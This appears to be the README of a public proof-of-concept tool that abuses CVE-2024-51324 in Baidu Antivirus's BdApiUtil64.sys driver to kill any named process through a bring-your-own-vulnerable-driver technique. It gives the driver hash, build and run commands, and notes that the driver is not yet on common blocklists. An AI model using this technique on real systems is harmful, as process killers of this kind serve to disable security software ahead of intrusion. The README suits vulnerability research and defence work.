# BdApiUtil-Killer
- PoC for CVE-2024-51324 vulnerability in BdApiUtil driver from Baidu Antivirus
- BdApiUtil64.sys SHA256: `47EC51B5F0EDE1E70BD66F3F0152F9EB536D534565DBB7FCC3A05F542DBE4428`
- As of 2025-06-10, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

## Usage

Place `BdApiUtil64.sys` in the same directory as the executable.

```text
BYOVD process killer using BdApiUtil64 driver (CVE-2024-51324)

Usage: BdApiUtil-Killer.exe --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., notepad.exe)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p BdApiUtil-Killer

# Run
.\BdApiUtil-Killer.exe -n notepad.exe
```

Windows 10 Pro (Up to date)

![CVE-2024-51324](https://github.com/user-attachments/assets/e14b806b-eff4-4ef7-a34b-14abf9b86f86)
